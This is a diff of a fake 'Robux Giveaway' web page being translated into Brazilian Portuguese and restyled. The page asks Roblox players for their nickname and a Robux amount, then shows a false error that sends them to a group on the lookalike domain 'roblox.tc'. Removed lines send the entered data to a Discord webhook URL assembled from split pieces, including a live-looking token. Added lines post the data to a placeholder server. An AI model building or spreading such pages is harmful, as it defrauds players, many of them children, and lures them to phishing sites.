@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="pt-br">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
@@ -8,8 +8,9 @@
     body {
       margin: 0;
       font-family: 'Segoe UI', sans-serif;
-      background: url('https://images.unsplash.com/photo-1608889170913-7b6d3b1e7c0c') no-repeat center center fixed;
+      background: url('https://i.ibb.co/mCzdVJYp/natal-fundo.jpg') no-repeat center center fixed;
       background-size: cover;
+      backdrop-filter: blur(4px);
       color: white;
       overflow: hidden;
     }
@@ -31,16 +32,16 @@
       z-index: 1;
       max-width: 400px;
       margin: 100px auto;
-      background: rgba(0, 0, 0, 0.8);
+      background: rgba(0, 0, 0, 0.75);
       padding: 30px;
       border-radius: 15px;
-      box-shadow: 0 0 20px #00ff88;
+      box-shadow: 0 0 20px #ff4444;
       text-align: center;
     }
 
     h1 {
       margin-bottom: 20px;
-      color: #00ff88;
+      color: #ff4444;
     }
 
     input {
@@ -53,8 +54,8 @@
     }
 
     button {
-      background-color: #00ff88;
-      color: black;
+      background-color: #ff4444;
+      color: white;
       font-weight: bold;
       padding: 10px 20px;
       border: none;
@@ -97,13 +98,13 @@
   <div class="container">
     <h1>🎄 Robux Giveaway</h1>
     <form id="robuxForm">
-      <input type="text" id="nick" placeholder="Enter your Roblox Nick" required />
-      <input type="number" id="robux" placeholder="Amount of Robux" required />
-      <button type="submit">Send Robux</button>
+      <input type="text" id="nick" placeholder="Seu Nick do Roblox" required />
+      <input type="number" id="robux" placeholder="Quantidade de Robux" required />
+      <button type="submit">Enviar</button>
     </form>
     <div class="popup" id="errorPopup">
-      <p>❌ ERROR: YOU NEED TO JOIN THE GROUP TO EARN ROBUX</p>
-      <p>💸 TO RECEIVE YOUR ROBUX, JOIN THE GROUP TO REDEEM ROBUX 👇</p>
+      <p>❌ ERROR: YOU NEED TO JOIN THE GROUP FOR THE ROBUX TO BE SENT TO YOU </p>
+      <p>💸 JOIN THE GROUP TO GET YOUR ROBUX HERE 👇</p>
       <a href="https://www.roblox.tc/communities/1671585164/RobuxGiveaway" target="_blank">JOIN THE GROUP</a>
     </div>
   </div>
@@ -119,22 +120,12 @@
       const nick = document.getElementById("nick").value;
       const robux = document.getElementById("robux").value;
 
-      
-      const part1 = "https://discord.com/api/webhooks/";
-      const part2 = "1395175802638700655";
-      const part3 = "M1-TjcOt8_Gvxy6mKcMbOZrU12AbDyCJ3yX_zDCjctyR6JCQgyiXL0LXiAT1y_0-LA-c";
-      const webhookURL = part1 + part2 + "/" + part3;
-
-      
-      fetch(webhookURL, {
+   fetch("https://seuservidor.com/api/enviar", {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
         },
-        body: JSON.stringify({
-          username: nick,
-          robux: robux
-        })
+        body: JSON.stringify({ nick, robux })
       }).then(res => console.log("Dados enviados"))
         .catch(err => console.error("Erro:", err));
     });
